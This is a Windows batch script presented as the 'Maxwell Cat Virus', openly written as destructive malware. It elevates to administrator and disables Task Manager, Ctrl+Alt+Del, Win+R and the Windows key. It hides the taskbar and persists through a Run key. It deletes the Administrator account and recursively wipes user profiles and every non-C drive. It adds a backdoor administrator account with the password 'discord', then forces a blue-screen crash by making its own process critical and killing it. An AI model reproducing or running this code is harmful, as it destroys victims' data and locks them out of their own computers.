@echo off
title mawxell cat
color 0C
setlocal
cls

echo.
echo  ============================================
echo      MAWXELL CAT  -  Maxwell Cat Virus
echo      ALLOWED: Windows 10 / 11 ONLY
echo      BLOCKED: XP, 7, 8, 8.1, Server
echo      Lock user: GUSAKDAVID / discord
echo      BSOD text: :)
echo  ============================================
echo.
timeout /t 1 /nobreak >nul

rem ---------- OS GATE: Win10/11 ONLY ----------
set "OSOK="
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName 2>nul | findstr /i /c:"Windows 10" /c:"Windows 11" >nul && set OSOK=1
if not defined OSOK goto :notok
for /f "skip=2 tokens=3" %%b in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber 2^>nul') do set BLD=%%b
if defined BLD if %BLD% lss 10240 goto :notok
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName 2>nul | findstr /i /c:"Windows XP" /c:"Windows 7" /c:"Windows 8" >nul && goto :notok

rem ---------- ELEVATE TO ADMIN ----------
net session >nul 2>&1
if %errorlevel% neq 0 (
  echo  Requesting admin rights...
  powershell -NoP -C "Start-Process -FilePath '%~f0' -Verb RunAs"
  exit /b
)

rem ---------- 1) KILL WIN+R ----------
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul 2>&1
echo  [1/7] Win+R killed ................. OK

rem ---------- 2) KILL + DELETE TASK MANAGER + CTRL+ALT+DEL ----------
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCAD /t REG_DWORD /d 1 /f >nul 2>&1
taskkill /f /im taskmgr.exe >nul 2>&1
takeown /f "%SystemRoot%\System32\taskmgr.exe" >nul 2>&1
icacls "%SystemRoot%\System32\taskmgr.exe" /grant *S-1-5-32-544:F >nul 2>&1
del /f /q "%SystemRoot%\System32\taskmgr.exe" >nul 2>&1
takeown /f "%SystemRoot%\SysWOW64\taskmgr.exe" >nul 2>&1
icacls "%SystemRoot%\SysWOW64\taskmgr.exe" /grant *S-1-5-32-544:F >nul 2>&1
del /f /q "%SystemRoot%\SysWOW64\taskmgr.exe" >nul 2>&1
echo  [2/7] Task Manager + Ctrl+Alt+Del .. OK

rem ---------- 3) FALSE WIN KEY ----------
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 00000000000000000300000000005BE000005CE000000000 /f >nul 2>&1
echo  [3/7] Win key disabled (false) ..... OK

rem ---------- 4) HIDE TASKBAR (no auto-logout - session stays) ----------
powershell -NoP -C "$k=(Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3' -EA SilentlyContinue).Settings; if($k){$k[8]=3; Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3' Settings $k}; Stop-Process -Name explorer -Force -EA SilentlyContinue" >nul 2>&1
echo  [4/7] Taskbar hidden, user NOT logged out . OK

rem ---------- 5) PERSISTENCE + BSOD TEXT :) ----------
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v mawxell_cat /t REG_SZ /d "%~f0" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v DisplayMessage /t REG_SZ /d ":)" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v DisplayParameters /t REG_SZ /d "mawxell cat" /f >nul 2>&1
echo  [5/7] Persistence + BSOD = :) ...... OK

rem ---------- 6) DELETE ADMINISTRATOR + OTHER FILES (current user KEPT) ----------
echo  [6/7] Deleting files... (current user NOT logged out)
powershell -NoP -EP Bypass -C "Stop-Process -Name explorer -Force -EA SilentlyContinue; Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer' NukeOnDelete 1 -Type DWord -EA SilentlyContinue; net user Administrator /active:no 2>$null; net user Administrator /delete 2>$null; Remove-Item C:\Users\* -Recurse -Force -EA SilentlyContinue; Remove-Item 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\*' -Recurse -Force -EA SilentlyContinue; Get-ChildItem $env:USERPROFILE -Recurse -Force -EA SilentlyContinue | Remove-Item -Recurse -Force -EA SilentlyContinue; Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Name -ne 'C'} | ForEach-Object {Get-ChildItem $_.Root -Recurse -Force -EA SilentlyContinue | Remove-Item -Recurse -Force -EA SilentlyContinue}"
echo  [6/7] Deletion DONE
timeout /t 2 /nobreak >nul

rem ---------- 7) LOCK SCREEN USER: GUSAKDAVID / discord ----------
net user GUSAKDAVID discord /add >nul 2>&1
if errorlevel 1 net user GUSAKDAVID discord >nul 2>&1
net localgroup Administrators GUSAKDAVID /add >nul 2>&1
net user GUSAKDAVID /active:yes /expires:never /fullname:"GUSAKDAVID" >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d "GUSAKDAVID" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d "discord" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d "0" /f >nul 2>&1
echo  [7/7] Lock screen set: GUSAKDAVID / discord . OK

rem ---------- MAXWELL CAT SPIN 60s -> BSOD :) ----------
mode con: cols=120 lines=35

> "%TEMP%\mcs.ps1" echo $ErrorActionPreference='Continue'
>> "%TEMP%\mcs.ps1" echo $sig = 'using System;using System.Runtime.InteropServices;public struct TP{public int Count;public long Luid;public int Attr;}public class BS{[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int n);[DllImport("advapi32.dll")]static extern bool OpenProcessToken(IntPtr h,uint a,out IntPtr t);[DllImport("advapi32.dll")]static extern bool LookupPrivilegeValue(string s,string n,out long l);[DllImport("advapi32.dll")]static extern bool AdjustTokenPrivileges(IntPtr t,bool d,ref TP p,int l,IntPtr z,IntPtr y);[DllImport("ntdll.dll")]public static extern int RtlSetProcessIsCritical(int b,ref int o,int s);[DllImport("kernel32.dll")]public static extern IntPtr GetCurrentProcess();[DllImport("kernel32.dll")]public static extern bool TerminateProcess(IntPtr h,uint e);public static void Go(){IntPtr tok;OpenProcessToken(GetCurrentProcess(),40,out tok);long lu;LookupPrivilegeValue(null,"SeDebugPrivilege",out lu);TP tp=new TP();tp.Count=1;tp.Luid=lu;tp.Attr=2;AdjustTokenPrivileges(tok,false,ref tp,0,IntPtr.Zero,IntPtr.Zero);int o=0;RtlSetProcessIsCritical(1,ref o,0);TerminateProcess(GetCurrentProcess(),0);}}'
>> "%TEMP%\mcs.ps1" echo try { Add-Type -TypeDefinition $sig } catch { Write-Host 'addtype failed' }
>> "%TEMP%\mcs.ps1" echo $h=(Get-Process -Id $PID).MainWindowHandle
>> "%TEMP%\mcs.ps1" echo try { [void][BS]::ShowWindow($h,3) } catch { }
>> "%TEMP%\mcs.ps1" echo [Console]::CursorVisible=$false
>> "%TEMP%\mcs.ps1" echo $sp=@([char]124,'/','-','\')
>> "%TEMP%\mcs.ps1" echo for($s=60;$s -ge 1;$s--){
>> "%TEMP%\mcs.ps1" echo  for($i=0;$i -lt 10;$i++){
>> "%TEMP%\mcs.ps1" echo   $p=($i -band 3)
>> "%TEMP%\mcs.ps1" echo   [Console]::SetCursorPosition(2,6)
>> "%TEMP%\mcs.ps1" echo   Write-Host ('    /\_/\      ' + $sp[$p] + '   ')
>> "%TEMP%\mcs.ps1" echo   [Console]::SetCursorPosition(2,7)
>> "%TEMP%\mcs.ps1" echo   Write-Host ('   ( o.o )     ' + $sp[$p] + '   ')
>> "%TEMP%\mcs.ps1" echo   [Console]::SetCursorPosition(2,8)
>> "%TEMP%\mcs.ps1" echo   Write-Host ('    ~~~~~      ' + $sp[$p] + '   ')
>> "%TEMP%\mcs.ps1" echo   [Console]::SetCursorPosition(2,10)
>> "%TEMP%\mcs.ps1" echo   Write-Host ('MAWXELL CAT   BSOD in ' + $s.ToString().PadLeft(3) + ' s   :)   ')
>> "%TEMP%\mcs.ps1" echo   Start-Sleep -Milliseconds 100
>> "%TEMP%\mcs.ps1" echo  }
>> "%TEMP%\mcs.ps1" echo }
>> "%TEMP%\mcs.ps1" echo [Console]::CursorVisible=$true
>> "%TEMP%\mcs.ps1" echo Write-Host ''
>> "%TEMP%\mcs.ps1" echo Write-Host 'BOOM. Goodbye.  :)'
>> "%TEMP%\mcs.ps1" echo Start-Sleep -Milliseconds 400
>> "%TEMP%\mcs.ps1" echo try { [BS]::Go() } catch { Write-Host 'crash failed' }

echo  [MAXWELL] spinning... BSOD in 60s
powershell -NoP -EP Bypass -File "%TEMP%\mcs.ps1"

rem ---------- FALLBACK REBOOT ----------
shutdown /r /t 0 /f
exit /b

:notok
echo  [X] This payload only runs on Windows 10 / 11.
echo  [X] Windows XP / 7 / 8 / 8.1 / Server NOT allowed.
timeout /t 3 /nobreak >nul
exit /b
